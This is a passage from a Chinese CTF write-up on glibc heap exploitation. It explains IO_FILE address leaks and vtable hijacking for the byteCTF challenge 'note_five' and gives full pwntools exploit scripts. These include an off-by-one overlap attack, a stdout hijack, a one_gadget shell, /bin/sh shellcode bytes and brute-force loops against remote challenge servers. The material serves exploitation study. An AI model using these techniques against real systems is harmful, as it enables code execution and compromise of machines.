            p.close()
            local = 1
            elf = ELF('./fkroman')
            if local:
                p = process('./fkroman')
                libc = elf.libc
            else:
                p = remote('116.85.48.105',5005)
                libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
            continue
        else:
            sl('cat flag')
    p.interactive()
总结：这里有1/16的概率可以泄露地址来getshell，但是还是比较简单的，写个循环去爆破就好了。
#### 四、先IO_File泄露地址再修改vtable控制程序流程
拿byteCTF的那道note_five为例：
这题质量还是挺高的，先来看看保护机制:
保护全开，然后看看ida分析逻辑：
    __int64 __fastcall main(__int64 a1, char **a2, char **a3)
    {
      unsigned int choice; // ST0C_4
      __int64 result; // rax
      init_0();
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            while ( 1 )
            {
              choice = menu();
              result = choice;
              if ( choice != 2 )
                break;
              edit();
            }
            if ( result > 2 )
              break;
            if ( result != 1 )
              goto LABEL_12;
            malloc_0();
          }
          if ( result != 3 )
            break;
          free_0();
        }
        if ( result == 4 )
          return result;
    LABEL_12:
        puts("bad choice");
      }
    }
常见的菜单题，
这里malloc的大小时unsortedbin的范围，没有fastbin的攻击，继续。
这里看看漏洞点：
edit时存在offbyone，同时没有puts函数可以泄露地址。
攻击思路如下：
1、利用offbyone实现overlap
2、利用overlap实现改BK指针，攻击global_max_fast
3、改FD指针为stdout-0x51，成功实现劫持
4、改结构体从而泄露真实地址
5、然后伪造stderr的vtable，由于程序报错会执行vtable+0x18处的IO_file_overflow函数，所以将这个IO_file_overflow函数改成onegadget
6、malloc很大的块，最后触发IO_file_overflow中的_IO_flush_all_lockp，从而getshell。
这里_wide_data要填我们劫持的地址+1的位置，同时要改_mode为1，表示报错模块。
上exp:
    #coding=utf8
    from pwn import *
    context.log_level = 'debug'
    context(arch='amd64', os='linux')
    local = 1
    elf = ELF('./note_five')
    if local:
        p = process('./note_five')
        libc = elf.libc
    else:
        p = remote('116.85.48.105',5005)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    #onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147
    #onegadget32(libc.so.6)  0x3ac5c  0x3ac5e  0x3ac62  0x3ac69  0x5fbc5  0x5fbc6
    # payload32 = fmtstr_payload(offset ，{xxx_got:system_mallocr})
    # f = FormatStr(isx64=1)
    # f[0x8048260]=0x45372800
    # f[0x8048260+4]=0x7f20
    # f.payload(7)
    #shellcode = asm(shellcraft.sh())
    #shellcode32 = '\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80' 
    #shellcode64 = '\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05'
    #shellcode64 = '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'
    def bk(mallocr):
        gdb.attach(p,"b *"+str(hex(mallocr)))
    def debug(mallocr,PIE=True):
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
            gdb.attach(p,'b *{}'.format(hex(text_base+mallocr)))
        else:
            gdb.attach(p,"b *{}".format(hex(mallocr)))
    sl = lambda s : p.sendline(s)
    sd = lambda s : p.send(s)
    rc = lambda n : p.recv(n)
    ru = lambda s : p.recvuntil(s)
    ti = lambda : p.interactive()
    def malloc(idx,size):
        ru("choice>> ")
        sl('1')
        ru("idx: ")
        sl(str(idx))
        ru("size: ")
        sl(str(size))
    def free(index):
        ru("choice>> ")
        sl('3')
        ru("idx:")
        sl(str(index))
    def edit(index,content):
        ru("choice>> ")
        sl('2')
        ru("idx: ")
        sl(str(index))
        ru("content: ")
        sd(content)
    def pwn():
        malloc(0,0xf8)
        malloc(1,0xf8)
        malloc(2,0xe8)
        malloc(3,0xf8)
        malloc(4,0xf8)
        free(0)
        payload = 'c' * 0xe0 + p64(0x2f0) + '\x00'
        edit(2,payload)
        free(3)
        malloc(0,0x2f0 - 0x10)
        payload = '\x11' * 0xf0 
        payload += p64(0) + p64(0x101)
        payload += '\x22' * 0xf0 + p64(0) + p64(0xf1) + "\n"
        edit(0,payload)
        free(1)
        global_max_fast = 0x77f8
        stdout = 0x77f8 - 0x1229
        payload = '\x11' * 0xf0
        payload += p64(0) + p64(0x101)
        payload += p64(0) + p16(0x77f8 - 0x10) + '\n'
        edit(0,payload)
        # debug(0)
        malloc(3,0xf8)
        malloc(3,0xf8)
        payload = '\x11' * 0xf0 
        payload += p64(0) + p64(0x101)
        payload += '\x22' * 0xf0 + p64(0) + p64(0xf1) + "\n"
        edit(0,payload)
        free(2)
        payload = '\x11' * 0xf0 
        payload += p64(0) + p64(0x101)
        payload += '\x22' * 0xf0 + p64(0) + p64(0xf1)
        payload += p16(stdout) + '\n'
        edit(0,payload)
        malloc(3,0xe8)
        malloc(4,0xe8)
        # debug(0)
        py = ''
        py += 'a'*0x41 + p64(0xfbad1800) + p64(0)*3 + '\x00' + '\n' 
        edit(4,py)
        rc(0x40)
        libc_base = u64(rc(8)) - 0x3c5600
        onegadget = libc_base + 0xf1147
        print "libc_base--->" + hex(libc_base)
        system = libc_base + libc.symbols["system"]
        fake_vtable = libc_base + 0x3c5600-8 
        binsh = libc_base + libc.search('/bin/sh\x00').next()
        py = '\x00' + p64(libc_base+0x3c55e0) + p64(0)*3+p64(0x1)+p64(0)+p64(onegadget)+p64(fake_vtable) + '\n'
        edit(4,py)
        # trigger abort-->flush
        malloc(1,1000)
    i = 0
    while 1:
        print i
        i += 1
        try:
            pwn()
        except EOFError:
            p.close()
            local = 1
            elf = ELF('./note_five')
            if local:
                p = process('./note_five')
                libc = elf.libc
                continue
            else:
                p = remote('121.40.246.48',9999)
        else:
            sl("ls")
            break
    p.interactive()
    # p.interactive()
    # 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
    # constraints:
    #   rcx == NULL
    # 0x4f322 execve("/bin/sh", rsp+0x40, environ)
    # constraints:
    #   [rsp+0x40] == NULL
    # 0x10a38c execve("/bin/sh", rsp+0x70, environ)
    # constraints:
    #   [rsp+0x70] == NULL
总结，IO_File是做堆题目时常用到的很好的方法，掌握泄露地址和改vtable实现控制程序执行流程，受益匪浅。